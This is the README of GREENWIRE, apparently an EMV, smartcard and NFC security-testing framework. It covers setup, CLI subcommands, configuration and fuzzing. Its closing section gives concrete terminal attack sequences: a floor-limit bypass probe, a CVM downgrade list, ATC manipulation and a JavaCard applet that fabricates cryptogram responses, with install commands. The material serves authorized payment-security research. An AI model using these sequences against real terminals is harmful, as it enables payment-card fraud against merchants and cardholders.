# GREENWIRE - EMV Security Testing Framework

**Mission:** Empower ethical, open research and field testing of smartcard, EMV, and NFC/JCOP technologies.

**License:** GPL v3

## Overview

GREENWIRE is a comprehensive smartcard and EMV security testing framework designed for security researchers, penetration testers, and academic use. It provides a unified command-line interface for interacting with smartcards, NFC devices, and EMV payment systems.

## Key Features

- **EMV Compliance Testing**: Full EMVCo specification validation and testing
- **Smartcard Operations**: JavaCard development, CAP file management, and APDU fuzzing  
- **NFC Operations**: NFC tag reading, writing, and security analysis
- **Android Integration**: ADB-based NFC testing and device management
- **Vulnerability Testing**: AI-powered mutation testing and anomaly detection
- **Hardware Support**: PC/SC readers, hardware security modules, and FIDO devices

## Installation

### Prerequisites

- Python 3.8+
- Java Development Kit (JDK) 11 or higher
- Android Debug Bridge (ADB) for Android NFC testing
- PC/SC smart card readers (optional, for hardware testing)

### Setup

```bash
# Install Python dependencies
pip install -r requirements.txt

# Compile Java components
javac -cp "." JCOPCardManager.java

# Test installation
python greenwire.py --help
```

## Quick Start

### Interactive Menu

```bash
python greenwire.py --menu
```

### Command Line Interface

```bash
# Test EMV functionality
python greenwire.py testing fuzz --iterations 100

# Generate test cards
python greenwire.py easycard generate random --count 5

# Probe hardware
python greenwire.py probe-hardware --auto-init

# Run APDU fuzzing
python greenwire.py apdu-fuzz --target emv --iterations 500
```

## Integrated Tools

GREENWIRE integrates several powerful tools to provide comprehensive smart card and NFC capabilities:

### APDU Communication

Direct APDU-level communication with smart cards via integrated apdu4j support:

```bash
# List available PC/SC readers
python greenwire.py apdu --list-readers

# Send APDU commands
python greenwire.py apdu --command 00A404000E325041592E5359532E444446303100 --verbose
```

### NFC Operations (`nfc` command)

- **Tool**: [nfc4pc](https://github.com/martinpaljak/nfc4pc)
- **Purpose**: NFC tag reading, writing, and emulation
- **Features**:
  - NDEF reading/writing for Type 2/4 tags
  - Emulation modes with ACR1252U
  - QR code generation
  - Continuous NFC reading
  - WebHooks for data posting

```bash
# Read NFC tag
python greenwire.py nfc read

# Write URL to NFC tag
python greenwire.py nfc write --url https://example.com

# Continuous NFC scanning
python greenwire.py nfc scan --continuous
```

### FIDO/WebAuthn Operations (`fido` command)

- **Tool**: [YAFU](https://github.com/martinpaljak/YAFU)
- **Purpose**: FIDO2/WebAuthn device management
- **Features**:
  - FIDOTool CLI for FIDO2 operations
  - CTAP2 protocol support
  - PIN handling and credential management
  - USB/NFC/TCP transports
  - Registration, authentication, and credential operations

```bash
# List FIDO credentials
python greenwire.py fido list

# Register new credential
python greenwire.py fido register --relying-party example.com --pin 123456

# Authenticate with credential
python greenwire.py fido authenticate --relying-party example.com --credential-id <id>
```

---

## Production Mode

Run GREENWIRE in production mode to disable debug output and reduce verbosity:

```bash
python greenwire.py --production <subcommand> [options]
```

This sets logging level to WARNING, suppressing INFO and DEBUG messages.

---

---

## Static Builds

For deployment without requiring Python dependencies, GREENWIRE supports static builds using PyInstaller.

### Creating Static Builds

1. **Install PyInstaller:**

  ```bash
  pip install pyinstaller
  ```

2. **Build Static Executable:**

  ```bash
  # Windows
  .\build_static.bat

  # Linux/macOS
  pyinstaller --onefile --name greenwire greenwire.py
  ```

3. **Bundled Dependencies:**
   The static build includes all required dependencies:
   - pyscard for PCSC support
   - nfcpy for NFC operations
   - cryptography for security functions
   - All standard library modules

4. **Deployment:**
   - The executable `dist/greenwire.exe` (Windows) or `dist/greenwire` (Linux/macOS) can be run on compatible systems
   - No Python installation required on target systems
   - All dependencies are bundled in the executable

### Build Customization

**Include Additional Files:**

```bash
pyinstaller --onefile --name greenwire --add-data "ca_keys.json;." --add-data "logs;logs" greenwire.py
```

**Cross-Platform Builds:**

- Build on the target platform for best compatibility
- Use virtual environments to control dependencies

---

## CLI Subcommands & Usage

Run:
```bash
python greenwire.py <subcommand> [options]
```

### Major Subcommands

- `apdu`           : Direct APDU communication with smart cards using apdu4j
- `nfc`            : NFC tag reading, writing, and emulation using nfc4pc
- `fido`           : FIDO/WebAuthn operations using YAFU
- `bg-process`     : Background process management (list, stop, status)
- `testing`        : Comprehensive smartcard testing platform with EMV-aware fuzzing, attack simulation, and automatic vulnerability detection
  - `fuzz`         : EMV-aware fuzzing with transaction flow analysis
  - `dump`         : Dump APDU communications and analyze patterns
  - `attack`       : Simulate known EMV attacks (wedge, CVM downgrade, PIN harvesting)
  - `auto-detect`  : Automatic vulnerability detection and reporting
  - `ai-vuln`      : Heuristic AI-style APDU mutation & anomaly detection (latency & SW pattern heuristics)
- `emulator`       : ISO/EMV emulator (with `--profile`, `--hardware`)
- `crypto`         : Cryptographic verification
- `issuance`       : Simulate card issuance (with `--csv-output`, `--hardware`, `--profile`, `--ca-file`)
- `easycard`       : Easy card operations - CA listing and card number generation
  - `list-ca`      : List available Certificate Authority types
  - `generate`     : Generate card numbers (random/certificate/manual methods) with installation method selection
- `probe-hardware` : Probe and initialize NFC/smartcard hardware (USB, PC/SC, NFC)
- `card-terminal`  : Act as a merchant card processor terminal with non-interactive mode
- `self-test`      : Run a basic self-test of all major features
- `dump-log`       : Dump .cap communication log
- `simulate-positive` : Simulate positive transaction results for a .cap file
- `export-replay`  : Export APDU replay log for a .cap file
- `import-replay`  : Import APDU replay log for a .cap file
- `dump-suspicious`: Dump suspicious events for a .cap file
- `learn-session`  : Update replay/suspicious logs after a positive session
- `seal-logs`      : Seal reserved log area in .cap with hash/signature
- `identitycrisis` : Random AID for each transaction (with optional `--smackdown` mode)
- `stealth`        : Stealth .cap: EMV compliant, minimal logging, random delays
- `replay`         : Replay .cap: EMV compliant, record/replay APDU/response pairs
- `decoy`          : Decoy .cap: EMV compliant, multiple applets (one real, others decoy)
- `audit`          : Audit .cap: EMV compliant, logs all APDUs, only Visa/Mastercard/Amex AIDs
- `install-cap`    : Install a .cap file on a smart card using GlobalPlatformPro or OpenSC

---

## CA Certificate/Key Support for EMV & Field Testing

GREENWIRE supports CA key/certificate management for EMV/terminal emulation and card issuance. The CA key file is a JSON array of objects with `rid`, `index`, `modulus`, and `exponent` fields, e.g.:

```json
[
  {
    "rid": "A000000003",
    "index": "92",
    "modulus": "C1D2E3F4A5B6C7D8E9F0C1D2E3F4A5B6C7D8E9F0C1D2E3F4A5B6C7D8E9F0C1D2",
    "exponent": "03"
  }
]
```

**To use your own CA key/cert:**
1. Add your CA key/cert to `ca_keys.json` in the above format.
2. Use the `--ca-file ca_keys.json` option with relevant CLI commands (e.g., `issuance`, `emulator`, `install-cap`).
3. For field/production use, ensure your CA key matches the card/AID you are issuing or testing.

### Example: Card Issuance with Custom CA Key

```bash
python greenwire.py issuance --csv-output cards.csv --hardware --profile pcsc --ca-file ca_keys.json
```

### Example: Install .cap File with Custom AID and CA Cert

```bash
python greenwire.py install-cap --cap-file myapplet.cap --tool gpp --aid A0000000031010 --ca-file ca_keys.json
```

**To validate a CA key/cert:**
- Check that the `rid` and `index` match the card/AID you are working with.
- Use the `issuance` or `emulator` subcommands with your CA file and verify successful operation/log output.

---

## Example CLI Usage

**Emulator with Hardware Profile:**
```bash
python greenwire.py emulator --cap-file mytest.cap --profile nfc --hardware
```

**Easy Card Operations:**
```bash
# List available Certificate Authorities
python greenwire.py easycard list-ca

# Generate random card numbers
python greenwire.py easycard generate random --count 5

# Generate card numbers based on CA certificates
python greenwire.py easycard generate certificate --count 3 --ca-file ca_keys.json

# Generate card numbers with custom prefix
python greenwire.py easycard generate manual --prefix 411111111111 --count 2

# Generate card numbers with installation method selection
python greenwire.py easycard generate random --count 3 --install-method globalplatform
```

**Hardware Probing:**
```bash
# Probe for available NFC/smartcard hardware
python greenwire.py probe-hardware
```

**Merchant Card Terminal:**
```bash
# Act as a card terminal with specified amount and bank code
python greenwire.py card-terminal --amount 25.99 --bank-code 123456

# Run card terminal in non-interactive mode for testing
python greenwire.py card-terminal --amount 10.00 --bank-code 123456 --non-interactive
```

**Background Process Management:**
```bash
# List all running background processes
python greenwire.py bg-process list

# Stop a specific background process by PID
python greenwire.py bg-process stop --pid 12345

# Check status of background processes
python greenwire.py bg-process status
```

**APDU Communication:**
```bash
# List available PC/SC readers
python greenwire.py apdu --list-readers

# Send APDU command to smart card
python greenwire.py apdu --command 00A404000E325041592E5359532E444446303100 --verbose

# Execute APDU commands from script file
python greenwire.py apdu --script my_commands.txt --reader "OMNIKEY CardMan 5x21 0"
```

**NFC Operations:**
```bash
# Read NFC tag
python greenwire.py nfc read

# Write URL to NFC tag
python greenwire.py nfc write --url https://example.com

# Write text to NFC tag
python greenwire.py nfc write --text "Hello World"

# Continuous NFC scanning
python greenwire.py nfc scan --continuous

# Emulate NFC tag with URL
python greenwire.py nfc emulate --url https://myapp.com
```

**FIDO/WebAuthn Operations:**
```bash
# List FIDO credentials
python greenwire.py fido list

# Register new credential
python greenwire.py fido register --relying-party example.com --pin 123456

# Authenticate with credential
python greenwire.py fido authenticate --relying-party example.com --credential-id <credential-id> --pin 123456

# Delete credential
python greenwire.py fido delete --credential-id <credential-id>

# Get FIDO device info
python greenwire.py fido info --transport usb
```

**Comprehensive Testing Platform:**
```bash
# EMV-aware fuzzing with transaction flow analysis
python greenwire.py testing fuzz --cap-file mytest.cap --transaction-flow

# Dump APDU communications and analyze patterns
python greenwire.py testing dump --cap-file mytest.cap --analyze

# Simulate known EMV attacks (wedge, CVM downgrade, PIN harvesting)
python greenwire.py testing attack --cap-file mytest.cap --attack-type wedge

# Automatic vulnerability detection and reporting
python greenwire.py testing auto-detect --cap-file mytest.cap --report
```

**Replay Mode:**
```bash
python greenwire.py replay --cap-file mytest.cap
```

**Audit Mode:**
```bash
python greenwire.py audit --cap-file mytest.cap
```

**Install .cap File (GlobalPlatformPro):**
```bash
python greenwire.py install-cap --cap-file myapplet.cap --tool gpp --aid A0000000031010
```

---

## Configuration Center & Global Defaults

GREENWIRE provides a unified persistent configuration layer that feeds multiple subsystems (fuzzers, reporting, menu tooling). Settings are stored in `global_defaults.json` (auto-created) managed by `core/global_defaults.py`.

### Managed Keys

| Key | Type | Purpose |
|-----|------|---------|
| verbose_default | bool | Default verbosity when a tool flag not explicitly set |
| max_payload_default | int | Upper bound for generated APDU/data payloads (protect hardware) |
| stateful_default | bool | Enable secondary ordered stateful phase for APDU fuzzing |
| artifact_dir_default | str | Base directory for reports, dashboards, JSON artifacts |

### Change via Menu

1. `python greenwire.py --menu`
2. Choose `11. Configuration Center`
3. Adjust values; changes persist immediately.

### Change via CLI

```bash
python greenwire.py config-defaults --list
python greenwire.py config-defaults --verbose-default false
python greenwire.py config-defaults --max-payload-default 4096 --artifact-dir-default fuzz_artifacts
python greenwire.py config-defaults --stateful-default true
```

Tools fall back to these defaults only when the corresponding runtime flags are omitted (e.g., `apdu-fuzz` uses `artifact_dir_default` if `--report-dir` not specified).

See: `APDU_FUZZING.md` (section "Configuration Center & Global Defaults") for deeper integration details.

---

## Module & Dependency Index

### Core Python Packages (External)

- pyscard (PC/SC smartcard I/O)
- nfcpy (NFC tag interaction)
- cryptography (crypto primitives, cert/key handling)
- pyudev (Linux USB device events, optional)
- base standard library: argparse, subprocess, threading, json, time, random, pathlib

### Integrated Upstream Toolchains

- apdu4j (APDU transport, Java; invoked through subprocess or wrappers)
- GlobalPlatformPro (CAP install / GP card management)
- nfc4pc (NFC operations, external tooling)
- YAFU (FIDO/WebAuthn operations)
- JavaCard toolchain (ant-javacard + SDK under `ant-javacard/`)
- Ghidra (reverse-engineering modules under `ghidra/`)
- binwalk (firmware analysis, Rust/JS hybrid in repo subdir)

### Internal Core Modules (Selected)

| Module | Purpose |
|--------|---------|
| core/config.py | Global runtime configuration abstraction |
| core/logging_system.py | Unified logging, tagging, error wrappers |
| core/imports.py | Dynamic/conditional module resolution |
| core/menu_system.py | Interactive menu framework |
| core/nfc_manager.py | NFC device abstraction & scanning |
| core/apdu_fuzzer.py | Modular APDU fuzzing engine & reporting |
| core/global_defaults.py | Persistent cross-feature defaults |
| core/file_fuzzer.py | File/image/binary fuzzing helpers |
| core/real_world_card_issuer.py | Realistic EMV card generation |
| core/nfc_emv.py | EMV over NFC processing logic |
| core/crypto/* (if present) | Crypto fuzzing / key management |

### Fuzzing / Analysis Artifacts

- native_apdu_fuzz_report_*.md – Per-run APDU fuzzing summaries
- native_apdu_fuzz_session_*.json – Structured session metrics & vulnerabilities
- fuzz_dashboard_summary.md – Aggregated multi-run trends

### Build / Tooling Dependencies

- Java (for apdu4j, GlobalPlatformPro, JavaCard builds)
- Ant / ant-javacard plugin
- Gradle (Java subprojects under `bc-java/`, `ghidra/`)
- Rust toolchain (binwalk variant crates)

### Optional / Conditional

- adb (Android NFC device verification & HCE scenarios)
- PyInstaller (static distribution generation)
- pcsc-lite (Linux smartcard backend)

### Environment Variables (Recognized)

| Variable | Effect |
|----------|--------|
| GREENWIRE_STATIC | Forces static/bundled import mode |
| JAVA_HOME (indirect) | Java toolchain resolution for GP/JC builds |

---

## Cross-References

- APDU fuzzing details & config integration: `APDU_FUZZING.md`
- JavaCard build pipeline: `ant-javacard/README.md`
- Ghidra module usage: `ghidra/` docs
- Firmware analysis: `binwalk/README.md`

---

## Contribution Notes (Config Layer)

When adding new global behaviors that should persist across sessions:

1. Add a key + sensible default in `core/global_defaults.py` `_DEFAULTS`.
2. Access via `load_defaults()` in feature module.
3. Provide override flag in CLI; only fall back when flag omitted.
4. Update README section above & any feature doc referencing it.

---

## Offline Java toolchain (JavaCard/GlobalPlatform)

GREENWIRE includes local JARs to operate fully offline for JavaCard CAP workflows.

- static/java/gp.jar — GlobalPlatformPro lightweight CLI
- lib/GlobalPlatformPro.jar — GlobalPlatformPro fat JAR
- static/java/ant-javacard.jar — ant-javacard helper
- sdk/javacard/lib — Optional local JavaCard SDK (for converter API stubs/tools)

Quick audit:

```bash
python tools/verify_java_static_setup.py
```

Gradle (offline) tasks:

- Root: `gradle listTools` (prints presence of local JARs)
- Applet: `cd javacard/applet` then `gradle buildCap` (prints offline CAP build guidance)

Notes:

- CAP conversion requires a local JavaCard SDK; the verifier shows optional missing SDK jars.
- Deployment can be done with local GlobalPlatformPro: `java -jar static/java/gp.jar --help`.

(End of appended sections.)

---

## JavaCard: Offline .cap Build and Deploy (Gradle)

GREENWIRE includes a fully offline JavaCard toolchain. Place the JavaCard SDK jars under `sdk/javacard/lib` (we already include `tools.jar` and `api_classic.jar`), and place JavaCard API export files under `sdk/javacard/api_export_files` (or `export`/`exp`).

From `javacard/applet`:

```powershell
# Convert to .cap with defaults
./gradlew convertCap

# Deploy the last built .cap
./gradlew deployCap

# Override applet metadata and paths via -P properties
./gradlew convertCap `
  -PappletClass=com.greenwire.applet.PinLogicApplet `
  -PpackageName=com.greenwire.applet `
  -PpackageVersion=1.0 `
  -PappletAID=A0:00:00:06:23:01:47:52:4E:57:52 `
  -PpackageAID=A0:00:00:06:23:01:47:52:4E:57:50 `
  -PexportPath=../../sdk/javacard/api_export_files `
  -PclassesDir=build/classes/java/main

# Deploy a specific .cap
./gradlew deployCap -PcapFile=build/cap/com/greenwire/applet/javacard/applet.cap
```

Notes:

- Export files are part of the JavaCard SDK; place them in one of the discovered folders above or pass `-PexportPath`.
- `deployCap` uses the local `GlobalPlatformPro.jar` under `lib/`.
- You can also use the convenience wrappers from the project root or lib folder:
  - `gp.ps1` (PowerShell) or `gp.cmd` (CMD)


## Centralized Menu Action Registry (MENU_ACTIONS)

Interactive menu actions are now resolved exclusively via a single authoritative registry in `menu_handlers.py`:

```text
from menu_handlers import MENU_ACTIONS
```

Benefits:

- Eliminates fragile dynamic attribute introspection
- Guarantees every visible menu entry maps to an implementation
- Simplifies auditing & testing (iterate `MENU_ACTIONS.keys()`)
- Enables future permission / capability gating at a single choke point

If you add a new interactive feature:

1. Implement the function in `menu_handlers.py` (or import a working impl from `menu_implementations.py`).
2. Add an entry to `MENU_ACTIONS` mapping `action_key -> function`.
3. Reference `handler_function` (or `id`) in the menu config so the core menu system resolves it immediately.

---

## AI Vulnerability Heuristic Testing (`testing ai-vuln`)

This module performs rapid, heuristic APDU mutation modeled after lightweight AI / evolutionary strategies to surface anomalous terminal or card behaviors without requiring a full protocol grammar.

Key Capabilities:

- Multiple mutation strategies: `bitflip`, `nibble`, `ga` (genetic‑style growth), `mixed` (round‑robin)
- Optional live execution through PC/SC or (future) Android relay; dry operation when hardware absent
- Latency statistics (avg, p50, p90, p99) and status word distribution
- Simple anomaly heuristics: unexpected SW, slow responses, custom whitelist
- JSON artifact for reproducibility / trend dashboards

Example Dry Run:

```bash
python greenwire.py testing ai-vuln --iterations 200 --strategy mixed --summary --seed 1337
```

Full Artifact with Custom Seeds & Slow Response Flagging:

```bash
python greenwire.py testing ai-vuln \
  --iterations 500 \
  --strategy ga \
  --pcsc \
  --seed-file seeds.json \
  --sw-whitelist 9000,6A82,6A83 \
  --min-latency-ms 120 \
  --json-out ai_vuln_run.json
```

Seed File Format (`seeds.json`):

```json
["00A4040007A0000002471001", "80CA9F1700"]
```

Artifact Structure (abridged):

```json
{
  "meta": {"started_at": 173223..., "duration_ms": 2543, "params": {"iterations": 500, ...}},
  "stats": {"count": 120, "avg_ms": 14, "p90_ms": 21, "distinct_sw": 1, "sw_counts": {"9000": 120}},
  "anomalies": [ {"type": "unexpected-sw", "apdu": "...", "sw": "6A82"} ],
  "mutations": [ {"apdu": "00A404...", "strategy": "bitflip", "status": "executed", ...} ]
}
```

Design Goal: Provide early signal on terminal/card edge behavior before heavier stateful fuzzing cycles are scheduled.

---

## Merchant Processor Exploitation / Vulnerability Test Sequences

GREENWIRE includes an interactive merchant exploitation simulator (`merchant_exploit_interactive`) and supports crafting APDU sequences to probe terminal defenses. Below are structured *research-grade* (not production) sequences you can adapt when legally authorized. Always obtain explicit permission and never test on live payment infrastructure without contractually defined scope.

### 1. Baseline Transaction (Reference Flow)

| Step | Purpose | APDU |
|------|---------|------|
| 1 | Select PPSE | `00A404000E325041592E5359532E444446303100` |
| 2 | Select App (e.g. Visa) | `00A4040007A0000000031010` |
| 3 | GPO (minimal PDOL) | `80A8000002830000` (Example PDOL: Tag 9F66 omitted) |
| 4 | Read AFL Records | `00B2010C00`, `00B2020C00`, etc. |
| 5 | Generate AC #1 | `80AE80002B` + 0x23 bytes CDOL1 data + `00` |
| 6 | (Optionally) Generate AC #2 | `80AE40002B...` |

### 2. Floor-Limit Bypass Probe

Goal: Observe terminal handling of crafted *below-floor* vs *just-above-floor* amounts and TVR bit setting.

Crafted GPO (PDOL includes amount + terminal country + transaction date):

```text
80 A8 00 00 0B 83 09 00 00 00 50 00 00 12 34 01 00
```

- Amount Authorized (Tag 9F02) = 00 00 00 50 00 (0.50) – deliberately tiny
- Terminal Country (9F1A) = 0x1234
- Transaction Date (9A) = YYMMDD (example 01 00 ?? placeholder)

Variant just over floor (simulate threshold crossing):

```text
80 A8 00 00 0B 83 09 00 00 01 F5 00 00 12 34 01 00   # Amount ~ 5.00
```

Compare TVR bits (especially byte 1 bit 8 – Offline data authentication not performed; byte 4 floor limit related) between both runs.

### 3. CVM Downgrade / CVM List Manipulation

When accessible (records containing CVM list Tag 8E), attempt to present a modified record (in a controlled lab card or emulator) where PIN methods are absent or replaced with signature/no CVM precedence.

Sample CVM List (8E) emphasizing signature then no CVM:

```text
8E 0E 1F 02 02 02 1E 03 03 03 1F 03 1F 03
```

If using a custom applet, respond to READ RECORD with altered 8E and observe terminal acceptance vs fallback prompts.

### 4. Rapid Reversal / Dual Authorization Timing (Logical Simulation)

While not pure APDU, you can emulate an early reversal scenario by:

1. Issuing first GENERATE AC (ARQC) normally.
2. Introducing an artificial delay + returning a second GENERATE AC with inconsistent ATC (if emulator controls it).
3. Observe terminal logging / error handling (some terminals mishandle ATC regression or rapid successive ARQCs).

### 5. Unexpected SW Pattern Injection

Return non-standard but syntactically valid status words (e.g., `6283`, `6F00`) during intermediate SELECT or READ phases in a controlled applet; monitor terminal fallback (should re‑select, bail out, or set TVR bits).

### 6. AI Mutation Seed Corpus (Recommended Minimal Set)

```text
00A404000E325041592E5359532E444446303100
00A4040007A0000000031010
80A8000002830000
80CA9F1700
80AE80002B0000000000000000000000000000000000000000000000000000000000000000
```

### JavaCard Test Applet Skeleton (Merchant TVR / CVM Probe)

`(Illustrative – place under applets/ and build with ant-javacard)`

```java
package merchantvuln;
import javacard.framework.*;
public class MerchantVulnTester extends Applet {
  private static final byte[] SELECT_OK = {(byte)0x90,0x00};
  private short atc = 0;
  public static void install(byte[] bArray, short bOffset, byte bLength){ new MerchantVulnTester().register(); }
  public void process(APDU apdu){
    byte[] buf = apdu.getBuffer();
    if(selectingApplet()) { Util.arrayCopyNonAtomic(SELECT_OK,(short)0,buf,(short)0,(short)2); apdu.setOutgoingAndSend((short)0,(short)2); return; }
    // GENERATE AC (80 AE) – fabricate TVR/CVM anomalies inside response template (simplified)
    if(buf[ISO7816.OFFSET_CLA]==(byte)0x80 && buf[ISO7816.OFFSET_INS]==(byte)0xAE){
       atc++; // Intentional monotonic counter – could manipulate for tests
       short le = 0;
       // Minimal TLV: 9F36(ATC), 9F27(CID), 9F10(IAD truncated) + SW
       buf[0]=(byte)0x9F; buf[1]=0x36; buf[2]=0x02; buf[3]=(byte)(atc>>8); buf[4]=(byte)atc;
       buf[5]=(byte)0x9F; buf[6]=0x27; buf[7]=0x01; buf[8]=(byte)0x80; // Force TC vs ARQC change
       buf[9]=(byte)0x9F; buf[10]=0x10; buf[11]=0x04; buf[12]=0xE0; buf[13]=0x00; buf[14]=0x00; buf[15]=0x00; // Simplified IAD
       // Append custom SW like 0x9000
       buf[16]=(byte)0x90; buf[17]=0x00;
       apdu.setOutgoingAndSend((short)0,(short)18);
       return;
    }
    // Default SW: Instruction not supported
    ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
  }
}
```

Compile & Install (example flow):

```bash
# (Adjust AID / package / applet as needed for your lab environment)
java -jar ant-javacard.jar -noverify -cap merchantvuln.cap -out build/ ./src/merchantvuln/
java -jar gp.jar -install merchantvuln.cap -force
```

> NOTE: The above applet intentionally simplifies EMV data objects; it is not standards-complete. Augment with full CDOL parsing if you need precise terminal reactions.

### Safety & Ethics

- Use ONLY in authorized lab or red team engagements.
- Maintain immutable logs of all test sequences.
- Do **not** persist PAN / track data beyond scope requirements.

---
